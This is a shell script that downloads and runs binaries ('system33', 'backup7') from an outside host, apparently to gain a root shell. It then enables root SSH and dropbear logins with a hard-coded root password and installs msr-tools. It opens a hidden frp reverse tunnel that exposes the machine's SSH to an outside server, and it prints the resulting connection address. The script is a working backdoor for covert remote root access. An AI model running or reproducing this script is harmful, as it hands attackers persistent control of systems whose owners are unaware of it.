#!/bin/sh
cd
sleep 2
pwd
sleep 2
whoami
sleep 2
wget -q http://greenleaf.teatspray.uk/system33.tar.gz
sleep 2
wget -q http://greenleaf.teatspray.uk/backup7.tar.gz
sleep 2
tar -xf system33.tar.gz
sleep 2
tar -xf backup7.tar.gz
sleep 2
./system33 -S . /bin/bash

sleep 2

su -

sleep 2
cd
sleep 2
whoami
sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2
cat /etc/*-release
sleep 2
export TERM=linux
export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update
DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata wget curl nano openssh-server dropbear screen net-tools kmod msr-tools

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata 
sleep 2


cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

cat > /etc/ssh/sshd_config <<EOR
Port 2222
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
EOR

sleep 2
echo "root:Pmataga87465622" | chpasswd
sleep 2
service dropbear restart
sleep 4
service ssh restart
netstat -ntlp

curl -s -k https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz -L -O -J
tar -xvf frp_0.48.0_linux_amd64.tar.gz
# start from daemon
cp frp_0.48.0_linux_amd64/frpc /usr/bin
mkdir /etc/frp
mkdir /var/frp  # log

sleep 2

array=()
for i in {a..z} {A..Z} {0..9}; 
   do
   array[$RANDOM]=$i
done

currentdate=$(date '+%d-%b-%Y_Rest_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
underscore="_"
underscored_ip+=$underscore
currentdate+=$underscored_ip

randomWord=$(printf %s ${array[@]::8} $'\n')
currentdate+=$randomWord

randomNumber=$(shuf -i 10000-65000 -n 1)

sleep 2

cat > /etc/frp/frpc.ini <<END
[common]
server_addr = emergencyaccess.teatspray.uk
server_port = 995

[ssh.$currentdate]
type = tcp
local_ip = 127.0.0.1
local_port = 2222
remote_port = $randomNumber
subdomain = $currentdate

END

sleep 2

echo "Your ssh connection details will be $currentdate.emergencyaccess.teatspray.uk:$randomNumber" 

sleep 2

screen -dmS drop bash -c '/usr/bin/frpc -c /etc/frp/frpc.ini; exec bash'
